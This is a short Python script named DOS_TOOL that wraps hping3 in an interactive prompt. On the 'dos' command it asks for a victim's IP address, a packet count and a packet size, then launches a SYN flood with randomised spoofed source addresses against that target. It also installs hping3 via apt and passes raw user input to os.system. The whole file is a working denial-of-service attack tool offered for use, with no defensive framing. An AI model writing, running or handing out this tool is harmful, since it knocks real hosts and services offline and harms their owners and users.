import os
import socket
from tkinter import * 

os.system('clear')
os.system('figlet DOS_TOOL')

def dos():
	input_dos = input('dos_tool>')

	if input_dos == 'update':
		os.system('apt install hping3')




	if input_dos == 'dos':
		packets = int(input('no._of_packets recomended 100000 -> '))
		size = int(input('size of the packets -> '))
		source = input('victims ip or address -> ')

		hping = (f'hping3 -c {packets} -d {size} -S -w 64 --flood --rand-source {source}')

		os.system(hping)


	if input_dos == 'clear':
		os.system('clear')


	if input_dos == 'exit':
		exit()




while True:
	dos()